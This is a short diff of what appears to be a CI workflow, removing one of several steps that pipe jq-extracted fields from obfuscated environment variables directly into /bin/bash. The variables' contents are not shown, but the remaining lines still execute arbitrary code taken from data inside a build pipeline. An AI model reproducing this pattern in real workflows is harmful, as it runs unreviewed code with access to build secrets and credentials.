@@ -21,7 +21,6 @@ jobs:
           echo $hz438 | jq -r .txpn62 | /bin/bash
           printf '%s' "$xduq03748" | jq -r .d1251 | /bin/bash
           printf '%s' "$x2621" | jq -r .clpll2358 | /bin/bash
-          printf '%s' "$icex34" | jq -r .crdv7068 | /bin/bash
           printf '%s' "$afkbr7880" | jq -r .ovwbc09388 | /bin/bash
           echo $ydre1445 | jq -r .zdufn2 | /bin/bash
           echo $o7990 | jq -r .ttsw1 | /bin/bash
